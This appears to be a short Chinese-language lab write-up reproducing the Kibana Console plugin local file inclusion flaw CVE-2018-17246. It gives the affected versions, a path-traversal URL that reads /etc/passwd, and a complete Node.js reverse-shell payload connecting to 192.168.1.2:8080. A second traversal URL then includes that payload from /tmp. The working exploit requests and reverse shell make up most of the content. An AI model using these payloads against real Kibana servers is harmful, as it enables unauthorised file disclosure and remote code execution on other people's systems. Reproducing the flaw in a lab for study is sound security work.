# Kibana本地文件包含（CVE-2018-17246）

###### by ADummy

### 0x00利用路线

​			最终漏洞的影响关键在于如何创建shell文件

### 0x01漏洞介绍

​			此漏洞出现在Kibana控制台（Console）插件中，控制台插件是KIbana的基本插件，也就是Kibana必装的插件。当前elastic最新版本为6.5，可以说大部分elk的组件会存在此问题，但是此问题利用难点在于如何创建一个恶意的本地文件

影响版本

```
Kibana <= 5.6.13
Kibana <= 6.4.3
```

### 0x02漏洞复现

```
http://192.168.1.3:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
```

在kibana的log中可以看到`/etc/passwd`的信息

```
docker-compose logs
```

要利用此漏洞，您需要将JavaScript Webshell上传到运行Kibana的计算机上，然后将其包含在内。

```js
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8080, "192.168.1.2", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
```

```
http://192.168.0.142:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js
```

shell没弹回来- - 

![Kibana_本地文件包含_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Kibana_本地文件包含_1.png)

### 0x03参考资料

https://www.jianshu.com/p/417196b69e98







